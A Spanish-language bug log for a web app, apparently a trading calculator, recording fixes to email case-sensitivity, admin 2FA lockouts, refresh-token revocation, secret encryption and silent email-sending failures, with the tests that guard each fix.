| BUG-070 | **El correo distinguía mayúsculas, así que quien lo tecleaba con otra caja no podía entrar.** `POST /auth/register` guardaba el correo **tal como se escribía** (`"email": user_data.email`) y `POST /auth/login` lo buscaba con igualdad exacta (`find_one({"email": credentials.email})`), que sobre `data->>'email'` en PostgreSQL **sí** distingue mayúsculas. Quien se registró como `Ana@x.com` y entraba como `ana@x.com` recibía **401 «Credenciales inválidas» con la contraseña correcta** — y ese 401 es byte a byte el mismo que el de una contraseña mala, así que no había ninguna pista, ni en pantalla ni en los logs de Cloud Run. El correo, en la práctica, no distingue mayúsculas: ningún proveedor real explota lo que la RFC 5321 §2.4 permite. **Y no era sólo el login.** El resto del código ya minusculizaba —Google (`info["email"].lower()`), magic link, reset, alta de admin— pero seguía comparando con igualdad exacta, así que una fila antigua en mayúsculas les era invisible: entrar con Google creaba una **cuenta nueva y vacía** en vez de la del usuario, el reset de contraseña no encontraba a nadie y decía que sí, y `admin/promote` no daba con el usuario que se le pedía ascender. El JWT del registro viajaba además con la caja tecleada mientras la fila guardaba otra, así que las comprobaciones que cruzan token y base (admin, revocación) comparaban cadenas distintas del mismo usuario. Fix: operador **`$ieq`** en el shim —`LOWER(...) = LOWER(...)`— usado en las diez búsquedas de identidad, el correo normalizado al escribir, y un **índice funcional** `idx_users_email_lower`, porque el que existía es sobre `(data->>'email')` a secas y PostgreSQL sólo usa un índice funcional si la expresión coincide: sin él cada login recorría `users` entera. **Lo que NO se hizo, y es la mitad importante**: resolverlo con `$regex` + `$options:i`, que el shim ya soportaba. Emite `~*`, que va **sin anclar**, y un correo es un regex válido —el `.` es comodín, el `+` cuantificador—, así que el patrón `ana@x.com` casaría con `otro+ana@x.com.evil.com`: sería una vía de suplantación de cuenta, no un arreglo. Hay un test que lo demuestra y un sabotaje que exige que salte. 7 tests, los tres sabotajes comprobados. **Y la mitad de delante**: los cuatro campos de correo de `AuthPages.jsx` no llevaban `autoCapitalize="none"` ni `autoCorrect="off"`, y ninguno de los cuatro formularios —entrar, registrarse, recuperar contraseña y enlace mágico— normalizaba antes de enviar. En móvil el teclado capitaliza la primera letra y un gestor de contraseñas rellena lo que guardó, así que el usuario tecleaba `Tradingcalculatorpro@gmail.com` sin querer y recibía «Credenciales inválidas». Ahora los cuatro envían `email.trim().toLowerCase()`. Es la misma defensa dos veces a propósito: el backend no puede fiarse del cliente, y el cliente no debe mandar basura que el backend tenga que limpiar. **Y el daño ya está hecho en producción**: la comprobación de duplicados del registro (`find_one({"email": user_data.email})`) distinguía igualmente, así que el mismo correo se dio de alta **dos veces** —confirmado por el propietario: la cuenta con los datos y el admin, creada desde el escritorio, y otra vacía creada desde el dominio nuevo con la mayúscula del teclado—. Eso explica el síntoma que lo destapó: en la URL de GitHub Pages la cuenta entra y es admin, y en `tradingcalculator.pro` no. Con duplicados vivos, `$ieq` **no basta**: `find_one` es `SELECT … LIMIT 1` **sin `ORDER BY`**, así que PostgreSQL devuelve una fila cualquiera del par y puede cambiar entre consultas — entrar unas veces en una cuenta y otras en la otra es peor que fallar, y en `admin/promote` o en el alta manual de un cobro significa ascender o acreditar la fila equivocada. Por eso las seis rutas de identidad (login, Google, magic link, reset, promote y alta manual de pago) pasan por `_buscar_usuario_por_correo()`: prefiere la coincidencia **exacta** —inequívoca— y, si no la hay, la **más antigua**, que es la original. No sustituye a borrar el duplicado; hace que mientras exista el resultado sea siempre el mismo. 13 tests y cinco sabotajes. | 🔴 | ✅ Resuelto (2026-08-28) — **requiere desplegar, y borrar a mano la cuenta duplicada** |

| BUG-071 | **Tras la caída del dominio, la web sólo funcionaba en incógnito.** `isAuthenticated` **sí** se persiste en `localStorage`; el token **no** (vive en la cookie httpOnly). Al recargar, `silentRefresh()` repone el token desde la cookie — y si el servidor responde 401 limpia la sesión y te manda a entrar, que es correcto. Pero si la petición falla **por red**, el `catch` dejaba `isAuthenticated: true` a propósito («puede ser pasajero») y sólo reseteaba `_isRefreshing`. **Un bloqueo de CORS entra exactamente por ahí**: es un `TypeError: Failed to fetch`, no una respuesta HTTP. Así que durante BUG-067 todo el que tuviera sesión guardada quedó con `isAuthenticated: true` y sin token: `ProtectedRoute` sólo miraba `isAuthenticated`, así que le dejaba pasar, la app pintaba la interfaz de alguien con sesión y **cada llamada iba sin credenciales** — pantallas vacías. Y no se curaba sola: cada recarga repetía lo mismo. La única salida era borrar los datos del sitio, que es justo lo que hace una ventana de incógnito — de ahí el síntoma. **Y había una segunda mitad**: nadie llamaba a `refreshUser`/`silentRefresh` **al arrancar**. Lo hacían `DashboardPage`, `PricingPage` y alguna más en su propio efecto, así que en el resto de rutas protegidas ni siquiera se intentaba reponer la sesión. Fix: (a) bandera `sessionUnverified` —no persistida— que el `catch` de red enciende y el éxito o el 401 apagan; (b) `ProtectedRoute` manda a `/login` cuando la sesión está sin verificar y no hay token, porque sin token no se puede hacer nada y pintar la interfaz de «con sesión» es mentira; (c) `<SessionBoot />` en `App.js`, un solo intento de reponer la sesión al arrancar, en un sitio, en vez de repartido por las páginas. Se mantiene la tolerancia al corte pasajero: un fallo de red **no** cierra la sesión, sólo deja de fingir que está verificada. | 🟠 | ✅ Resuelto (2026-08-28) |

| BUG-072 | **El panel de administración funcionaba en incógnito y no en el navegador de siempre.** El 2FA es **obligatorio** para administradores: `require_admin` devuelve **428** a todo `/admin/*` si la cuenta no tiene TOTP, y en producción no se puede desactivar (`ADMIN_2FA_OPTIONAL` ignora la variable de entorno fuera de desarrollo, a propósito). `ProtectedRoute` lo refleja con `user?.two_factor_enabled === false → /settings`, para no meter al admin en una pantalla que va a fallar entera. Pero de las ocho respuestas que construyen el objeto `user`, **sólo tres mandaban ese campo** (`/auth/me`, verificación TOTP y passkey): login, `/auth/refresh`, magic link, Google y el registro lo omitían. Con el campo ausente vale `undefined`, y **`undefined === false` es falso**, así que la guarda no saltaba. De ahí los dos comportamientos: en **incógnito** se entra con `/auth/login` —sin el campo— y la guarda deja pasar; en el navegador **de siempre** el `user` guardado en `localStorage` venía de un `/auth/me` anterior, que sí lo manda, así que valía `false` y expulsaba a Ajustes. El mismo usuario, la misma cuenta, dos resultados según por dónde hubiera entrado. Y el «funciona» de incógnito era falso: el panel se pintaba y cada llamada devolvía 428. Fix: el campo viaja en las ocho respuestas. **La regla que lo fija** no comprueba los cuatro sitios conocidos —eso dejaría pasar el siguiente endpoint que se escriba— sino que recorre con `ast` **todo** objeto `user` de respuesta y exige que quien mande `is_admin` mande también `two_factor_enabled`. Los identifica por posición (el valor de la clave `"user"`, más el `return` de `/auth/me`), no por sus claves: un heurístico por claves marcaba también las filas de base de datos y las tablas del panel, que no tienen por qué llevarlo, y un verificador que grita con código correcto se desactiva en una semana. Saboteada en las dos direcciones. | 🟠 | ✅ Resuelto (2026-08-28) — **requiere desplegar** |

| BUG-073 | **El panel de administración no explicaba por qué no funcionaba: o salía vacío, o se caía entero.** Reproducido en navegador real (sonda `tests/e2e/navegador/panel-admin.js`), son dos fallos distintos y ninguno decía nada. (a) **428**: `require_admin` devuelve `428 Precondition Required` con el motivo en `detail` cuando el administrador no tiene 2FA —obligatorio en producción—, pero `loadAll()` sólo contemplaba **401 y 403**, así que el 428 caía al `catch` genérico: `metrics` se quedaba en `null`, el panel se pintaba **vacío** y el motivo se quedaba en la consola del navegador. El 428 existe precisamente para distinguir «no puedes» de «te falta un paso», y se estaba desperdiciando. (b) **Una respuesta 200 con otra forma** —un backend más antiguo, un error envuelto distinto— hacía que `metrics.by_locale.length` lanzara `TypeError: Cannot read properties of undefined`, lo recogía el `ErrorBoundary` y se llevaba la **página entera** por delante: «Algo salió mal», que no dice nada de lo que pasa. Es la misma forma que el `history.map is not a function` del panel (BUG del 2026-08-13): una respuesta que no es la esperada guardada tal cual en un estado que luego se recorre. Fix: rama explícita para el 428 que muestra el `detail` del backend y lleva a **Ajustes**, que es donde se activa el 2FA; y `by_locale?.length ?? '—'`, porque una cifra que falta es un guion, no una página en blanco. **La sonda no necesita backend ni Postgres**: sirve el build y responde a `/api/**` ella misma, porque lo que se prueba es cómo reacciona la interfaz — montar la base de datos para esto lo habría hecho tan caro que no se ejecutaría. Saboteada en los dos sentidos. | 🟠 | ✅ Resuelto (2026-08-28) |

| BUG-074 | **Sin `SECRET_ENCRYPTION_KEY`, las claves de Stripe/SendGrid/PayPal/Google caían a texto plano en Postgres, en silencio.** `_encrypt_setting()` sólo cifra si esa variable está en el entorno; si no, devuelve el valor tal cual, sin loguear nada. Y la variable **no aparece en ningún workflow ni en `DEPLOY_CHECKLIST.md`** —sólo en `.env.example`, vacía—, así que era fácil que nunca se hubiera puesto en Cloud Run. El panel de Ajustes/Conectores no daba ninguna señal: un admin tecleaba la clave secreta de Stripe y no tenía forma de saber si quedaba cifrada. (De paso, revisado el otro half del hallazgo original —`POST /admin/settings` de `admin_routes.py` saltándose el cifrado y comparando contra la máscara `"***"`—: **ya no aplica**, el `PUT /admin/settings` de `server.py`, que es el que de verdad llama el panel, ya cifraba correctamente y rechazaba un valor con el carácter de máscara dentro). Fix: `cifrado_activo()` nuevo junto a `_get_fernet()`, un aviso una sola vez al arrancar si la clave falta (antes no había ni log), `GET /admin/settings` la expone como `encryption_active`, y el panel pinta un aviso ámbar cuando es `false` en vez de dejarlo en silencio. No se aborta el guardado: dejar al admin sin poder configurar la pasarela sería peor que el riesgo que evita. **No rota nada retroactivamente**: un secreto ya guardado en claro sigue en claro hasta que se vuelva a guardar con la clave puesta. 7 tests nuevos en `test_secret_encryption_unit.py`. **Sigue pendiente, y es operativo, no de código**: generar la clave y ponerla en Cloud Run — ver `DEPLOY_CHECKLIST.md` §C. | 🟠 | ✅ Resuelto en el repo (2026-08-31) — **requiere generar y desplegar `SECRET_ENCRYPTION_KEY`** |

| BUG-075 | **Reportado por el dueño: "el envío de correos no funciona ni magic link".** Dos causas, una de código y una operativa, ya documentada pero sin marcar como bloqueante en la práctica. **(a) Código — fallo silencioso de verdad**: `_send_magic_link_email()` y `_send_email_verification()` mandan el correo con `httpx` en crudo (`POST` directo a la API de SendGrid) y **nunca miran el código de respuesta**. `httpx` no lanza excepción por un 4xx/5xx —sólo por fallos de red—, así que una clave inválida, un dominio remitente sin verificar o un 429 de SendGrid fallaban **sin excepción, sin log, sin rastro**: el `except` nunca se disparaba porque no había nada que capturar. El tercer camino de envío, `_send_email()` (reset de contraseña, bienvenida, confirmación de suscripción), sí usa el SDK oficial de SendGrid, que **sí** lanza y **sí** queda logueado — por eso "ni magic link" es la pista: es justo el camino que no dejaba huella. **(b) Operativo, no de código, y ya estaba escrito**: `docs/MIGRACION_DOMINIO.md` § «Lo que falta» punto 6 y `DEPLOY_CHECKLIST.md` §H llevan sin marcar desde el cutover del dominio (2026-08-28) — *"Dominio remitente verificado para `alerts@tradingcalculator.pro`. Hasta entonces los correos transaccionales no salen."* Sin esa verificación en el panel de SendGrid, **cualquiera** de los tres caminos de envío es rechazado, y sólo dos de los tres lo habrían dicho en los logs. El punto 2 del mismo documento (`FRONTEND_URL` en el propio servicio de Cloud Run, que sobrevive al despliegue y le gana al valor por defecto del código) es la otra mitad: si sigue con el dominio viejo, aunque el correo llegue, el enlace de dentro apunta a la URL antigua. Fix de código: ambas funciones ahora miran `resp.status_code` y loguean el cuerpo de la respuesta de SendGrid en un `>= 300` — no cambia si el correo sale o no, sólo hace que el fallo real (sea cual sea) quede escrito en los logs de Cloud Run en vez de desaparecer. 3 tests nuevos en `test_email_send_status_unit.py`. **Lo que de verdad lo arregla es operativo, no está en este commit**: verificar el dominio remitente en SendGrid y confirmar `FRONTEND_URL` en el servicio — `MIGRACION_DOMINIO.md` puntos 2 y 6. | 🟠 | 🟡 Código resuelto (2026-08-31) — **requiere verificar el dominio en SendGrid y `FRONTEND_URL` en Cloud Run** |

| BUG-076 | **Reportado por el dueño: «hay que arreglar el admin de inmediato». El administrador estaba ENCERRADO: se le exigía el 2FA y se le escondía dónde activarlo.** `SettingsPage.jsx` pintaba `<TwoFactorCard />` sólo si `user?.auth_provider === 'password'`. La cuenta del dueño entra con **Google**, así que la secuencia completa era: `/admin` → `ProtectedRoute` ve `two_factor_enabled === false` → **te manda a `/settings` a activar el 2FA** → en `/settings` **no hay ninguna tarjeta de 2FA**. Sin salida, sin mensaje y sin manera de deducirlo desde la pantalla. Y el backend **nunca** puso esa condición: `/auth/2fa/setup`, `/enable` y `/disable` van por `require_user` y no miran el proveedor — la restricción existía sólo en esa línea del frontend. Verificado en navegador contra el backend real: con `auth_provider='google'` la tarjeta no se pintaba, y con el arreglo se pinta, `setup` responde, un código TOTP real la activa y el panel vuelve. **Se cierra con tres piezas más.** (a) **Margen de alta de 10 minutos**, pedido por el dueño: `require_admin` abre una ventana de un solo uso la primera vez que un admin sin TOTP toca el panel (`ADMIN_2FA_GRACE_MINUTES`, `admin_2fa_grace_started_at` en la fila). Se abre **al usarla**, no al crear la cuenta —un admin de hace seis meses conserva el suyo, un atacante sólo lo encuentra si el dueño nunca ha pisado el panel—, **no se reescribe nunca** —ni al vencer, ni al activar y desactivar el 2FA— y deja aviso en el log y entrada en `admin_audit_log`. A `0` se apaga entera. El panel enseña mientras tanto una banda ámbar con el enlace a Ajustes. (b) **`ProtectedRoute` deja de decidir sobre el 2FA de admin** — es el hueco **G-39**: el frontend no conoce ni `ADMIN_2FA_OPTIONAL` ni el margen, así que expulsaba también a admins que el servidor sí iba a dejar entrar (y obligaba a fabricar un TOTP real para mirar el panel en local). Manda el **428**, que `AdminPage` ya traduce desde BUG-073. (c) **El registro decía `is_admin: False` fijo** mientras las otras siete respuestas de auth lo calculaban con `ADMIN_EMAILS`: el dueño que se registrara por primera vez con su propio correo de admin salía a una sesión sin panel hasta recargar. 8 tests nuevos y 6 sabotajes. | 🔴 | ✅ Resuelto (2026-08-31) — **requiere desplegar backend y frontend** |

| BUG-077 | **Recargar la pestaña cerraba la sesión, y cerrar sesión no cerraba nada.** Dos fallos opuestos en el mismo par de tokens. **(a) La recarga te echaba.** `/auth/refresh` **rota** el token: revoca el que le llega y emite otro. Y el frontend lo llama en **cada arranque**, porque el de acceso vive sólo en memoria. Un segundo canje del mismo token —una pestaña que arranca detrás, una petición reintentada, una respuesta cuyo `Set-Cookie` no llegó a guardarse— recibía **401**, y `silentRefresh` trataba el 401 como «el servidor dice que esta sesión no vale» y la cerraba. Medido: con el código anterior, reusar el token recién rotado da 401; con `REFRESH_ROTATION_GRACE_SECONDS` (30 s, sólo para lo revocado **por rotación**) da 200. **Y la mitad más gorda**: `silentRefresh` cerraba la sesión ante **cualquier** respuesta no-OK. El backend vive en Cloud Run **sin instancias calientes**, así que la primera petición tras un rato de silencio —que es literalmente ésta— arranca un contenedor: un 502 o un timeout de arranque en frío se leía como «tu sesión ha caducado». Ahora sólo el **401/403** cierra la sesión, y antes de rendirse se reintenta una vez con 45 s de margen. **(b) Cerrar sesión dejaba vivo el refresh token.** `/auth/logout` revocaba el de **acceso** —una hora— y borraba las cookies, pero el de **refresco** —siete días, y es el que abre la puerta— no se tocaba: borrar la cookie limpia un navegador, no invalida el token. Medido contra el backend real: tras pulsar «cerrar sesión», `POST /auth/refresh` con ese token devolvía **200** y una sesión nueva. Ahora se revocan los dos, marcados como `logout`, que es el motivo que la ventana de rotación **no** perdona. 7 tests nuevos y 3 sabotajes. | 🔴 | ✅ Resuelto (2026-08-31) — **requiere desplegar** |

| BUG-078 | **`probar-verificadores.sh` decía «SOBREVIVE al sabotaje» sobre verificadores que estaban perfectos: el guardián de los guardianes tenía el fallo que existe para cazar.** Dos causas distintas, el mismo síntoma. **(a)** Los ocho bloques `python - <<'EOF'` llevaban el cuerpo indentado dos espacios para alinearlo con el resto del script, y Python leído por `stdin` **no admite indentación a nivel de módulo**: los ocho morían con `IndentationError`. **(b)** El sabotaje del login buscaba `{"email": {"$ieq": credentials.email}}`, texto que **BUG-070 había sustituido** por `_buscar_usuario_por_correo()`: el `replace` no encontraba nada, escribía el fichero igual y salía con 0. En los dos casos el fichero quedaba **intacto**, el verificador seguía pasando —correctamente— y el informe lo acusaba de no verificar nada. Reproducido en una copia limpia de `main`. **La causa de fondo, que era G-41 y se cierra aquí**: `probar()` ejecutaba `eval "$sabotaje" >/dev/null 2>&1` y **descartaba el código de salida**, así que «el verificador no verifica» y «el sabotaje no llegó a tocar nada» imprimían exactamente lo mismo. Ahora un sabotaje que falla se reporta con su error y cuenta como fallo **del propio test**, no del producto; igual en `probar_inverso()` con su cebo. Y el sabotaje del login lleva `assert count == 1` sobre su ancla, para que la próxima reescritura grite en vez de mentir. | 🟠 | ✅ Resuelto (2026-08-31) — cierra también G-41 |

| BUG-079 | **Cerrar sesión seguía sin revocar el refresh token: el arreglo de BUG-077(b) era correcto y el navegador nunca lo alcanzaba.** `logout` lee el token de refresco de `request.cookies.get("refresh_token")` y lo revoca — pero la cookie se emite con `path=/api/auth/refresh` (a propósito: así no viaja en cada llamada a la API) y el frontend cerraba sesión contra `/api/auth/logout`, que **no cuelga de esa ruta**. Por la regla de rutas del navegador (RFC 6265 §5.1.4) la cookie no se manda, así que `crudo_refresh` era `None` **en todos los navegadores** y el `_revoke_token` del refresco no se ejecutó jamás. Consecuencia: exactamente el agujero que BUG-077(b) decía tapar — quien tuviera copia del token (una extensión, una copia del perfil, un proxy) seguía canjeándolo por sesiones nuevas **siete días** después de pulsar «cerrar sesión»—. **Y el test lo bendecía**: `test_cerrar_sesion_revoca_tambien_el_refresh` lee el CÓDIGO FUENTE, encuentra la línea de la cookie, cuenta los dos `motivo="logout"` y da el visto bueno; todo eso era cierto y la revocación no ocurría. El «medido contra el backend real» de BUG-077(b) se hizo con un cliente HTTP, que manda la cookie que le pongas sin aplicar la regla de rutas. Fix: `logout` se registra **también** en `/api/auth/refresh/logout` —que sí recibe las dos cookies— y es la que llama el store; `/api/auth/logout` se mantiene para bundles viejos ya abiertos, con decisión escrita y fecha de retirada en [`RUTAS_MUERTAS.md`](./RUTAS_MUERTAS.md). 4 tests nuevos que implementan la regla del navegador en vez de leer el fuente, y 2 sabotajes. | 🔴 | ✅ Resuelto (2026-09-01) — **requiere desplegar backend y frontend** |

| BUG-080 | **Reportado por el dueño: «se ha vuelto a producir el error de inicio de sesión con cuentas de Google». Con 2FA activo, entrar con Google era imposible — y con enlace mágico también.** El backend exige el segundo factor en las **tres** vías que abren sesión, y las tres responden igual: HTTP **200**, `{"totp_required": true, "pending_token": …}` y **sin** `token`. No es un error: es un paso intermedio. Sólo el formulario de contraseña sabía leerlo. `loginWithGoogle` caía en su `if (!data.token) throw` y devolvía **«Error con Google»**, y `MagicPage` caía en su `else` y decía **«enlace inválido»** sobre un enlace perfectamente válido. En los dos casos, sin ninguna pista de que lo que faltaba era teclear el código. **Le tocaba justo a quien más lo iba a sufrir**: el 2FA es obligatorio para administradores y la cuenta del dueño entra con Google — es decir, esto se disparó al activar el 2FA que BUG-076 acababa de hacer posible. Fix: el reto vive en un solo componente (`TwoFactorChallenge.jsx`) que usan las tres pantallas, y `loginWithGoogle` devuelve el mismo contrato que `login` (`totpRequired` + `pendingToken`). La prueba **no fija una lista de rutas**: recorre `server.py` con `ast`, saca toda función que responda `totp_required` y exige que el frontend la lea en el bloque que atiende esa llamada — una vía nueva que se olvide sale sola. 4 tests y 3 sabotajes (uno de ellos cazó que la primera versión del test buscaba el nombre del componente y lo encontraba **en un comentario**). | 🔴 | ✅ Resuelto (2026-09-01) — **requiere desplegar frontend** |

| BUG-081 | **Reportado por el dueño: «al abrir desde el ordenador no se despliega bien el widget de registro/inicio de sesión». Era un agujero, y llevaba ahí desde siempre.** El botón de Google lo pinta Google dentro de un iframe, no nosotros. Si su script no carga —bloqueador, cookies de terceros bloqueadas, red cortada— o si el origen **no está autorizado** en la consola de Google, el contenedor se queda **vacío** y no salta ningún error que React pueda recoger: `onError` sólo cubre el fallo de una credencial **ya emitida**. Como el separador «o continúa con» se pintaba siempre, la tarjeta quedaba con un rótulo y debajo un hueco de 40 px, sin una palabra que explicara nada — y el usuario sin saber si el problema era suyo, del sitio o de su cuenta. Verificado en navegador contra el build: en un entorno con `accounts.google.com` cortado, `/login` y `/register` pintaban el separador y el vacío. Fix: se mide si Google llegó a meter algo en su contenedor y, si a los 5 s no hay nada, se sustituye el separador por un aviso que dice qué ha pasado y por dónde entrar. **La primera versión del detector medía la ALTURA y no detectaba nada**: `<GoogleLogin>` pone `style={{height: 40}}` en su propio div para reservar el sitio, así que mide 40 px esté vacío o lleno. Leyendo el código parecía correcto; lo cazó la sonda de navegador. Ahora cuenta descendientes. Aviso traducido a los 10 idiomas. | 🟠 | ✅ Resuelto (2026-09-01) — **requiere desplegar frontend** |

---

*Actualizado 2026-08-28 — el cutover de dominio se hizo a medias y tumbó el backend de toda la web (BUG-067). El documento que lo describe decía «todo o nada, en este orden»; se hicieron cuatro pasos de ocho.*
